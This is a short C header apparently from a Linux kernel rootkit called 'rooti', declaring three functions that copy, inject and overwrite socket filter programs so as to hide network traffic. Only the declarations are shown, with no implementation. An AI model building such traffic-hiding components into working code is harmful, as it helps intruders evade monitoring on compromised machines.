#ifndef _ROOTI_HIDING_TRAFFIC_H
#define _ROOTI_HIDING_TRAFFIC_H

int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, sockptr_t fprog_ptr, int fprog_len);
int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_filter_program);
int rooti_overwrite_traffic_filter(struct sock *sock);

#endif